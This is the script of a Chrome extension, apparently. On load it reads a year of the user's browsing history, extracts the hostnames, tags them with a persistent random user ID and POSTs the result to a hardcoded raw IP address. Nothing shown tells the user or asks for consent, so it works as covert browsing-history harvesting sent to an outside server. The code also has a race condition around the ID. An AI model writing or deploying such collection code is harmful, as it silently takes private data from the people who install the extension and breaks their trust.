const MAXRESULT = 1000000
var target = 'http://115.146.93.15';


//we want to generate a unique user ID per each chrome extension installed


function getRandomToken() {
    // E.g. 8 * 32 = 256 bits token
    var randomPool = new Uint8Array(32);
    crypto.getRandomValues(randomPool);
    var hex = '';
    for (var i = 0; i < randomPool.length; ++i) {
        hex += randomPool[i].toString(16);
    }
    // E.g. db18458e2782b2b77e36769c569e263a53885a9944dd0a861e5064eac16f1a
    console.log("THIS USER'S TOKEN IS: ", hex);
    return hex;
}


function getHistory(){
    //here we call chrome.history.search
    //we make its callback function update our html page

    let seconds = 1000 * 60 * 60 * 24 * 7 * 365;
    let oneYearAgo = (new Date).getTime() - seconds;

    chrome.history.search({
        
        'text': '',
        'maxResults': MAXRESULT,
        'startTime': oneYearAgo,
        },
        function(result){
            //console.log(result);
            list = parseHistory(result);
            sendURL(list);
    });
}

function parseHistory(result){
    var output_obj = {};
    output_obj.urls = []
    for(var i = 0; i < result.length; i++){
        let str = result[i].title + " - " + result[i].url;
        let url_full_regex = /https?:\/\/(www\.)?[-a-zA-Z0-9@:%._\+~#=]{2,256}\.[a-z]{2,6}\b([-a-zA-Z0-9@:%_\+.~#?&//=]*)/;
        let url_full = new RegExp(url_full_regex);
        let newstr = str.match(url_full);
        try{
            newstr = str.match(url_full)[0];
        }
        catch{
            //pass
        }

        out_str = parseURL(newstr).hostname;
        output_obj.urls.push(out_str);
    }
    output_obj.ID = id;
    console.log("ID is: ", output_obj.ID);
    var out = JSON.stringify(output_obj);
    document.body.appendChild(document.createTextNode(out));
    return out;
}

function parseURL(url) {
    //https://www.abeautifulsite.net/parsing-urls-in-javascript
    var parser = document.createElement('a'),
        searchObject = {},
        queries, split, i;
    // Let the browser do the work
    parser.href = url;
    // Convert query string to object
    queries = parser.search.replace(/^\?/, '').split('&');
    for( i = 0; i < queries.length; i++ ) {
        split = queries[i].split('=');
        searchObject[split[0]] = split[1];
    }
    return {
        protocol: parser.protocol,
        host: parser.host,
        hostname: parser.hostname,
        port: parser.port,
        pathname: parser.pathname,
        search: parser.search,
        searchObject: searchObject,
        hash: parser.hash
    };
}

function sendURL(jsonfile){
    var request = new XMLHttpRequest();

    request.open("POST", target.concat('/receive'), true);
    request.setRequestHeader("Content-Type", "application/json;charset=UTF-8");
    console.log("Sending");
    request.send(jsonfile);

    request.onload = function(){
        console.log("WE GOT A RESPONSE:", this.responseText);
    }
}

//This section runs the main body.

let id = null;

document.addEventListener('DOMContentLoaded', function () {
    console.log("starting it")
    chrome.storage.sync.get('userid', function(items) {
        var userid = items.userid;
        if (userid) {
            useToken(userid);
        } 
        //TODO: CREATE A CASE TO CHECK ID ON SERVERSIDE
        else {
            userid = getRandomToken();
            chrome.storage.sync.set({userid: userid}, function() {
                useToken(userid);
            });
        }
        function useToken(userid) {
            // TODO: Use user id for authentication or whatever you want.
            id = userid;
        }

    });
    console.log("dabadee")
    let retrieved = getHistory();

});
